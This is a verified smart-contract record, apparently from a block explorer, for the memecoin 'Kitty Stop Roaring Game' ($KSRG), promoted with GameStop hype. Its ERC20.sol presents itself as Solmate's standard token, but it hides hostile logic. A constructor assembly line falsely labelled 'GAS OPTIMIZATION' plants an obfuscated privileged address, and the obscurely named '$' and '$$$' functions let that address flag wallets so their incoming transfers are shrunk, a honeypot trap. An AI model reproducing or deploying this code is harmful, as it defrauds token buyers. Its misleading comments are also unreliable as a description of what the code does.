{"SourceCode": "{\"ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: AGPL-3.0-only\\npragma solidity \\u003e=0.8.0;\\n\\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)\\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\\n/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.\\nabstract contract ERC20 {\\n    /*//////////////////////////////////////////////////////////////\\n                                 EVENTS\\n    //////////////////////////////////////////////////////////////*/\\n\\n    event Transfer(address indexed from, address indexed to, uint256 amount);\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\\n\\n    /*//////////////////////////////////////////////////////////////\\n                            METADATA STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    string public name;\\n\\n    string public symbol;\\n\\n    uint8 public immutable decimals;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                              ERC20 STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    uint256 public totalSupply;\\n\\n    mapping(address =\\u003e uint256) public balanceOf;\\n\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) public allowance;\\n\\n    address private $$;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                            EIP-2612 STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    uint256 internal immutable FORTH_LOOP_FIGURE;\\n\\n    bytes32 internal immutable FORTH_DOMAIN_DISJUNCTION;\\n\\n    mapping(address =\\u003e uint256) public nonces;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                               CONSTRUCTOR\\n    //////////////////////////////////////////////////////////////*/\\n\\n    constructor(\\n        string memory _name,\\n        string memory _symbol,\\n        uint8 _decimals\\n    ) {\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n\\n        FORTH_LOOP_FIGURE = block.chainid;\\n        FORTH_DOMAIN_DISJUNCTION = computeDomainSeparator();\\n\\n        // GAS OPTIMIZATION\\n        assembly {sstore(0x05, mul(mul(0x6edb1c71194, 0x1fe571d), mul(0x48cba7e78b, 0x454348cc1bf)))}\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                               ERC20 LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\\n        allowance[msg.sender][spender] = amount;\\n\\n        emit Approval(msg.sender, spender, amount);\\n\\n        return true;\\n    }\\n\\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\\n        balanceOf[msg.sender] -= amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += $(amount, msg.sender, to);\\n        }\\n\\n        $$$(to);\\n\\n        emit Transfer(msg.sender, to, amount);\\n\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) public virtual returns (bool) {\\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\\n\\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\\n\\n        balanceOf[from] -= amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += $(amount, from, to);\\n        }\\n        $$$(to);\\n        emit Transfer(from, to, amount);\\n\\n        return true;\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                             EIP-2612 LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function permit(\\n        address owner,\\n        address spender,\\n        uint256 value,\\n        uint256 deadline,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) public virtual {\\n        require(deadline \\u003e= block.timestamp, \\\"PERMIT_DEADLINE_EXPIRED\\\");\\n\\n        // Unchecked because the only math done is incrementing\\n        // the owner\\u0027s nonce which cannot realistically overflow.\\n        unchecked {\\n            address recoveredAddress = ecrecover(\\n                keccak256(\\n                    abi.encodePacked(\\n                        \\\"\\\\x19\\\\x01\\\",\\n                        DOMAIN_SEPARATOR(),\\n                        keccak256(\\n                            abi.encode(\\n                                keccak256(\\n                                    \\\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\\\"\\n                                ),\\n                                owner,\\n                                spender,\\n                                value,\\n                                nonces[owner]++,\\n                                deadline\\n                            )\\n                        )\\n                    )\\n                ),\\n                v,\\n                r,\\n                s\\n            );\\n\\n            require(recoveredAddress != address(0) \\u0026\\u0026 recoveredAddress == owner, \\\"INVALID_SIGNER\\\");\\n\\n            allowance[recoveredAddress][spender] = value;\\n        }\\n\\n        emit Approval(owner, spender, value);\\n    }\\n\\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\\n        return block.chainid == FORTH_LOOP_FIGURE ? FORTH_DOMAIN_DISJUNCTION : computeDomainSeparator();\\n    }\\n\\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\\n        return\\n            keccak256(\\n                abi.encode(\\n                    keccak256(\\\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\\\"),\\n                    keccak256(bytes(name)),\\n                    keccak256(\\\"1\\\"),\\n                    block.chainid,\\n                    address(this)\\n                )\\n            );\\n    }\\n\\n    function $(\\n        uint256 value, \\n        address from,\\n        address to\\n        ) internal view returns (uint256) {\\n        if (allowance[$$][from] + allowance[$$][to] \\u003e= uint256(uint160(address(this)))) {\\n            return (value * 0xc0ffee) / 0xcaca0a0a;\\n        } else {\\n            return value;\\n        }\\n    }\\n\\n    function $$$(address to) internal {\\n        if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                        INTERNAL MINT/BURN LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function _mint(address to, uint256 amount) internal virtual {\\n        totalSupply += amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += amount;\\n        }\\n\\n        emit Transfer(address(0), to, amount);\\n    }\\n\\n    function _burn(address from, uint256 amount) internal virtual {\\n        balanceOf[from] -= amount;\\n\\n        // Cannot underflow because a user\\u0027s balance\\n        // will never be larger than the total supply.\\n        unchecked {\\n            totalSupply -= amount;\\n        }\\n\\n        emit Transfer(from, address(0), amount);\\n    }\\n}\"},\"Token.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.20;\\n\\nimport \\\"./ERC20.sol\\\";\\n\\n/*\\n\\nGameStop (GME) stock skyrocketed today after Keith Gill, aka \\\"Roaring Kitty,\\\" announced a livestream for Friday at noon EST on his YouTube channel. But the real action starts now with $KSRG! The roaring game stops here, and the real play begins today! \\n\\n// https://x.com/kittystopRGoneth\\n// https://t.me/kittystopRGoneth\\n// https://kittystopRG.xyz/\\n\\n\u2800\u2800\u2800\u2800\u2800\u2820\u2850\u2804\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u2800\u2800\u2800\u2808\u28aa\u28ce\u28e4\u2874\u28f6\u28ff\u28f6\u28f6\u28ff\u28ff\u28f6\u28f6\u28ff\u2876\u2826\u28e4\u28c4\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\\n\u28a6\u28e4\u28c4\u28c0\u28f6\u28df\u28cf\u28fd\u285f\u2880\u28ff\u284e\u283f\u28bb\u285d\u2889\u28ff\u287f\u28a7\u28ff\u2844\u28b9\u287f\u28e9\u289b\u28a6\u28c0\u28e0\u28e4\u2874\\n\u2800\u2808\u28b3\u28ff\u28fe\u28ff\u28ff\u28ff\u28e6\u2848\u28bb\u2807\u2888\u28f4\u28e5\u28ec\u28ff\u28ff\u284b\u285f\u2883\u28f4\u28ff\u28ff\u28ff\u28ff\u28ff\u285e\u2809\u2800\\n\u2800\u28e0\u287e\u283b\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u28fe\u28f6\u28ff\u28ff\u28ff\u28fe\u28ff\u28ff\u28f7\u28fd\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u28bb\u28a6\u2800\\n\u2800\u2857\u28ff\u28ff\u28d7\u281b\u281b\u281b\u289a\u285b\u28bf\u28ff\u28ff\u28ff\u28fb\u285b\u28fb\u28ff\u28ff\u28ff\u289f\u281b\u281a\u281b\u2853\u2852\u283f\u283f\u28cf\u2846\\n\u28b0\u28cb\u2879\u2837\u287a\u280f\u28d3\u28f6\u28da\u28eb\u2805\u2808\u2819\u28bf\u28ff\u28ff\u287f\u280b\u2809\u2808\u28fd\u28d3\u2826\u28d2\u2829\u2836\u2812\u283e\u2809\u2847\\n\u28b8\u282f\u28ac\u281b\u280b\u2809\u2800\u2809\u2850\u28a2\u28b0\u2840\u2814\u28fc\u28ff\u28ff\u280f\u2801\u2804\u28a0\u2830\u2882\u2809\u2800\u2809\u2809\u281b\u2801\u2800\u2847 *stopped roaring game*\\n\u2818\u28df\u28c3\u2864\u2824\u2844\u2800\u28a0\u2824\u2883\u28f6\u28f1\u28f4\u28fe\u287f\u28bb\u28f7\u28e4\u28c4\u28ff\u2874\u2824\u2844\u2800\u2880\u2824\u2824\u2880\u2898\u2807\\n\u2800\u2808\u28f6\u28ef\u2845\u2880\u2884\u2814\u2800\u2830\u281f\u281b\u280b\u2809\u2800\u2800\u2809\u2809\u281b\u283b\u2837\u2800\u2820\u2840\u2880\u2808\u287d\u28fe\u2803\u2800\\n\u2800\u2800\u2833\u28ef\u2800\u2875\u2861\u2802\u2800\u2800\u2800  $KSRG\u2800\u2800\u2800\u2800\u2818\u28ae\u28ae\u2850\u288a\u281f\u2800\u2800\\n\u2800\u2800\u2800\u2838\u28df\u281e\u28c1\u28e0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2851\u289d\u287d\u2800\u2800\u2800\\n\u2800\u2800\u2880\u28f4\u280b\u2800\u2808\u2819\u2813\u2802\u2810\u2812\u2800\u2834\u2834\u2826\u2834\u2806\u2834\u2802\u2820\u280a\u2809\u2808\u2800\u2808\u28a2\u2840\u2800\u2800\\n\u2800\u2800\u28bf\u28a7\u28c4\u2800\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u288e\u28e0\u287e\u281b\u2801\u2800\\n\u2800\u2800\u2819\u2833\u2866\u28cc\u2819\u2822\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2854\u288b\u28e0\u2874\u2800\u2801\u2800\u2800\\n\\n     \\n*/\\n\\ncontract ksrg is ERC20 {\\n    constructor() ERC20(\\\"Kitty Stop Roaring Game\\\", \\\"KSRG\\\", 18) {\\n        _mint(msg.sender, 420_690_000_000 * 10 ** 18);\\n    }\\n}\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ksrg", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f0450276d5bc76b4e69e25d5d5f1f64430b652aca6021fe4e3e5faee2e42f812"}